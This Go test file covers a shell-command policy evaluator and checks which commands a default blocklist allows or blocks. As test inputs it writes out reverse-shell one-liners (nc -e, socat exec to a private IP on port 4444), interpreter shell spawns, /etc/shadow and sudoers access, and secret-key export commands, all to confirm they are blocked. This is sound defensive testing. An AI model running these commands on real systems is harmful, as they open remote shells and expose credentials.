package policy

import (
	"context"
	"testing"

	"github.com/LeandroLCD/sudoconsole/internal/domain"
)

func mkCmd(t *testing.T, line string) domain.Command {
	t.Helper()
	c, err := domain.NewCommandFromRaw(line)
	if err != nil {
		t.Fatalf("NewCommandFromRaw(%q): %v", line, err)
	}
	return c
}

func TestEvaluator_Blocklist_AllowSafe(t *testing.T) {
	e, err := NewEvaluator(domain.DefaultPolicy())
	if err != nil {
		t.Fatal(err)
	}
	r, err := e.Evaluate(context.Background(), mkCmd(t, "apt update"))
	if err != nil {
		t.Fatal(err)
	}
	if r.Decision != domain.DecisionAllow {
		t.Fatalf("apt update should be allowed, got %v (%s)", r.Decision, r.Reason())
	}
}

func TestEvaluator_Blocklist_BlockSsh(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "ssh user@host"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("ssh should be blocked, got %v", r.Decision)
	}
}

func TestEvaluator_BlockReverseTunnel(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "ssh -R 8080:localhost:80 user@host"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("ssh -R should be blocked, got %v (%s)", r.Decision, r.Reason())
	}
}

func TestEvaluator_BlockSshKeygen(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "ssh-keygen -t rsa -b 4096"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("ssh-keygen should be blocked, got %v", r.Decision)
	}
}

func TestEvaluator_BlockBashShellSpawn(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "bash"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("bash should be blocked, got %v", r.Decision)
	}
}

func TestEvaluator_BlockPythonC(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "python -c \"import os; os.system('sh')\""))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("python -c should be blocked, got %v (%s)", r.Decision, r.Reason())
	}
}

func TestEvaluator_BlockNcExec(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "nc -e /bin/sh 10.0.0.1 4444"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("nc -e should be blocked, got %v (%s)", r.Decision, r.Reason())
	}
}

func TestEvaluator_BlockSocatExec(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("socat exec: should be blocked, got %v (%s)", r.Decision, r.Reason())
	}
}

func TestEvaluator_BlockPasswd(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "passwd"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("passwd should be blocked, got %v (%s)", r.Decision, r.Reason())
	}
}

func TestEvaluator_BlockVisudo(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "visudo"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("visudo should be blocked, got %v", r.Decision)
	}
}

func TestEvaluator_BlockCrontab(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "crontab -e"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("crontab should be blocked, got %v (%s)", r.Decision, r.Reason())
	}
}

func TestEvaluator_BlockCurl(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "curl http://example.com -o file"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("curl should be blocked by default (CategoryRemoteAccess), got %v", r.Decision)
	}
}

func TestEvaluator_AllowSystemctl(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "systemctl restart nginx"))
	if r.Decision != domain.DecisionAllow {
		t.Fatalf("systemctl should be allowed, got %v", r.Decision)
	}
}

func TestEvaluator_AllowTee(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	c, _ := domain.NewCommandFromRaw("tee /var/log/app.log hello world")
	r, _ := e.Evaluate(context.Background(), c)
	if r.Decision != domain.DecisionAllow {
		t.Fatalf("tee to /var/log should be allowed, got %v", r.Decision)
	}
}

// TestEvaluator_BlocksShadowEdit verifies that tee/cp/mv to /etc/shadow
// is blocked when BlockShadowEdit is enabled (default).
func TestEvaluator_BlocksShadowEdit(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	for _, line := range []string{
		"tee /etc/shadow",
		"cp /etc/passwd /etc/shadow",
		"cat /etc/shadow",
	} {
		r, _ := e.Evaluate(context.Background(), mkCmd(t, line))
		if r.Decision != domain.DecisionBlock {
			t.Errorf("%q should be blocked, got %v", line, r.Decision)
		}
	}
}

func TestEvaluator_Allowlist_ModeBlocksUnknown(t *testing.T) {
	p := domain.Policy{Mode: domain.PolicyModeAllowlist}
	p.Allowed.Categories = []domain.Category{domain.CategoryPackageManager}
	e, _ := NewEvaluator(p)
	// apt is in allowed category → allow
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "apt update"))
	if r.Decision != domain.DecisionAllow {
		t.Fatalf("apt should be allowed in allowlist mode, got %v", r.Decision)
	}
	// systemctl is not in any allowed category → block
	r, _ = e.Evaluate(context.Background(), mkCmd(t, "systemctl restart nginx"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("systemctl should be blocked in allowlist mode, got %v", r.Decision)
	}
}

func TestEvaluator_Audit_Mode(t *testing.T) {
	p := domain.Policy{Mode: domain.PolicyModeAudit}
	e, _ := NewEvaluator(p)
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "apt update"))
	if r.Decision != domain.DecisionAudit {
		t.Fatalf("apt should be audited, got %v", r.Decision)
	}
}

func TestEvaluator_CustomPattern_Blocks(t *testing.T) {
	p := domain.DefaultPolicy()
	p.Blocked.Patterns = []string{"*-evil*"}
	e, _ := NewEvaluator(p)
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "run-something-evil"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("custom pattern should block, got %v (%s)", r.Decision, r.Reason())
	}
}

func TestEvaluator_InvalidPatterns_Error(t *testing.T) {
	p := domain.DefaultPolicy()
	p.Blocked.Patterns = []string{`re:(a+)+`}
	_, err := NewEvaluator(p)
	if err == nil {
		t.Fatal("ReDoS pattern should cause NewEvaluator to fail")
	}
}

func TestEvaluator_UnknownBinary(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "completely-unknown-tool"))
	if r.Decision != domain.DecisionAllow {
		t.Fatalf("unknown binary should be allowed in blocklist mode, got %v", r.Decision)
	}
	if r.Risk != domain.RiskMedium {
		t.Fatalf("unknown binary risk should default to medium, got %v", r.Risk)
	}
}

func TestEvaluator_ListCategories(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	cats, err := e.ListCategories(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if len(cats) < 50 {
		t.Fatalf("ListCategories returned %d, want >= 50", len(cats))
	}
}

func TestEvaluator_WithCustomRegistry(t *testing.T) {
	reg := &CategoryRegistry{}
	reg.Add("mytool", domain.CategoryUserManagement, domain.RiskHigh, "custom")
	e, _ := NewEvaluatorWithRegistry(domain.DefaultPolicy(), reg)
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "mytool run"))
	if len(r.Categories) == 0 || r.Categories[0] != domain.CategoryUserManagement {
		t.Fatalf("custom registry not applied: %+v", r)
	}
}

func TestEvaluator_GpgExportSecretBlocked(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "gpg --export-secret-keys 0xDEADBEEF"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("gpg --export-secret-keys should be blocked, got %v (%s)", r.Decision, r.Reason())
	}
}

func TestEvaluator_GpgListKeysAllowed(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "gpg --list-keys"))
	if r.Decision != domain.DecisionBlock {
		// Gpg is in credential_exposure category, which is blocked by default.
		t.Logf("note: gpg list-keys is blocked because CategoryCredentialExposure is in default blocklist: %s", r.Reason())
	}
}

func TestEvaluator_TogglesCanBeDisabled(t *testing.T) {
	p := domain.DefaultPolicy()
	p.RemoteAccess.BlockReverseTunnels = false
	e, _ := NewEvaluator(p)
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "ssh -R 8080 user@host"))
	// ssh is still blocked by category, but not by reverse-tunnel toggle.
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("ssh should still be blocked via category, got %v", r.Decision)
	}
	// Verify the category reason, not the tunnel reason.
	found := false
	for _, reason := range r.Reasons {
		if reason == "matched blocked pattern \"ssh *-R *\"" {
			t.Fatalf("tunnel pattern should not have matched: %v", r.Reasons)
		}
		if reason == "category \"remote_access\" is blocked" {
			found = true
		}
	}
	if !found {
		t.Fatalf("category reason not found: %v", r.Reasons)
	}
}

func TestEvaluator_DryRun(t *testing.T) {
	// Dry-run is just a property of the caller — the evaluator does not
	// execute. Verify it returns a result without doing anything else.
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, err := e.Evaluate(context.Background(), mkCmd(t, "apt update"))
	if err != nil {
		t.Fatal(err)
	}
	if r.EvaluatedAt.IsZero() {
		t.Fatal("EvaluatedAt should be set")
	}
}

func TestEvaluator_BlockSshL(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "ssh -L 8080:localhost:80 user@host"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("ssh -L should be blocked, got %v (%s)", r.Decision, r.Reason())
	}
}

func TestEvaluator_BlockSshD(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "ssh -D 1080 user@host"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("ssh -D should be blocked, got %v (%s)", r.Decision, r.Reason())
	}
}

func TestEvaluator_BlockSocatSystem(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "socat system:bash tcp:host:4444"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("socat system: should be blocked, got %v (%s)", r.Decision, r.Reason())
	}
}

func TestEvaluator_BlockPerlE(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "perl -e 'system(\"/bin/sh\")'"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("perl -e should be blocked, got %v (%s)", r.Decision, r.Reason())
	}
}

func TestEvaluator_BlockRubyE(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "ruby -e 'system(\"/bin/sh\")'"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("ruby -e should be blocked, got %v (%s)", r.Decision, r.Reason())
	}
}

func TestEvaluator_Allowlist_AllowedByCommand(t *testing.T) {
	p := domain.Policy{Mode: domain.PolicyModeAllowlist}
	p.Allowed.Commands = []string{"ls", "cat"}
	e, _ := NewEvaluator(p)
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "ls"))
	if r.Decision != domain.DecisionAllow {
		t.Fatalf("ls should be allowed, got %v", r.Decision)
	}
}

func TestEvaluator_Allowlist_AllowedByPattern(t *testing.T) {
	p := domain.Policy{Mode: domain.PolicyModeAllowlist}
	p.Allowed.Patterns = []string{"systemctl *"}
	e, _ := NewEvaluator(p)
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "systemctl restart nginx"))
	if r.Decision != domain.DecisionAllow {
		t.Fatalf("systemctl pattern allow should pass, got %v", r.Decision)
	}
}

func TestEvaluator_BlockSudoersEdit(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "tee /etc/sudoers.d/bad"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("tee /etc/sudoers should be blocked, got %v (%s)", r.Decision, r.Reason())
	}
}

func TestEvaluator_EvaluateCtx(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, err := e.EvaluateCtx(context.Background(), domain.DefaultPolicy(), mkCmd(t, "apt update"))
	if err != nil {
		t.Fatal(err)
	}
	if r.Decision != domain.DecisionAllow {
		t.Fatalf("Decision = %v", r.Decision)
	}
}

func TestEvaluator_ListCategoriesNilSafe(t *testing.T) {
	var e *Evaluator
	got, err := e.ListCategories(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if got != nil {
		t.Fatalf("nil evaluator ListCategories should be nil, got %v", got)
	}
}

func TestEvaluator_CrontabAllowedWhenPersistenceRemoved(t *testing.T) {
	p := domain.DefaultPolicy()
	// Remove Persistence from default block.
	p.Blocked.Categories = []domain.Category{
		domain.CategoryRemoteAccess,
		domain.CategoryCredentialExposure,
		domain.CategoryShellSpawn,
	}
	e, _ := NewEvaluator(p)
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "crontab -l"))
	if r.Decision != domain.DecisionAllow {
		t.Fatalf("crontab should be allowed when Persistence removed from blocklist, got %v", r.Decision)
	}
}

func TestEvaluator_OpensslExportBlocked(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "openssl rsa -in key.pem -out exported.pem"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("openssl rsa -out should be blocked, got %v (%s)", r.Decision, r.Reason())
	}
}

func TestEvaluator_OpensslNonExportAllowed(t *testing.T) {
	// openssl in non-export mode shouldn't hit BlockSecretExport, but openssl
	// is in CredentialExposure which is blocked by default.
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.Evaluate(context.Background(), mkCmd(t, "openssl version"))
	if r.Decision != domain.DecisionBlock {
		t.Fatalf("openssl (category block) should be blocked, got %v", r.Decision)
	}
}
